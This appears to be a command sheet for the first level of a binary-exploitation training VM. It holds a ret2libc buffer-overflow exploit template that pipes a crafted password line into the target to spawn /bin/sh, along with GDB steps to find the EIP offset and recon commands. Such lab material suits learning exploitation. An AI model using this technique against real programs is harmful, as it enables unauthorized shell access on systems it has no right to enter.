# Level01 — commands

## Exploit (template — fill values from GDB on the VM)

Purpose: second line overflows the password buffer; first line must be `dat_wil` to reach `fgets` for the password.

```bash
( python3 -c "
import struct, sys
# --- set from GDB (see walkthrough §6) ---
OFF = 0          # offset from start of password buffer to saved EIP
SYSTEM = 0x0
EXIT = 0x0
BINSH = 0x0
# ----------------------------------------
pad = b'A' * (OFF - 5)
# keep first 5 bytes as 'admin' so verify_user_pass still matches (optional but stable)
payload = b'dat_wil\n' + b'admin' + pad + struct.pack('<III', SYSTEM, EXIT, BINSH) + b'\n'
sys.stdout.buffer.write(payload)
" ) | ./level01
```

Purpose:
- Pipe a two-line stdin: valid username, then crafted password line starting with `admin` + padding + ret2libc frame.

---

## GDB — measure offset (pattern)

```bash
gdb -q ./level01
```

```gdb
break *0x08048579
run
```

Input:

```text
dat_wil
< PATTERN_OR_ASCII_CYCLE >
```

After crash (or second run with breakpoint):

```gdb
info registers eip
x/wx $esp
```

Use your pattern tool offset for `$eip` (PEDA `pattern_offset`, GEF `pattern search`, etc.).

Purpose:
- Turn a crash into a numeric **OFF** for the template above.

---

## Recon (binary on VM)

```bash
strings ./level01 | grep -E '^admin$|^dat_wil$'
readelf -s ./level01 | head
ldd ./level01
```

Purpose:
- Confirm reference strings; locate **libc** path for `system` / `/bin/sh` resolution in GDB.
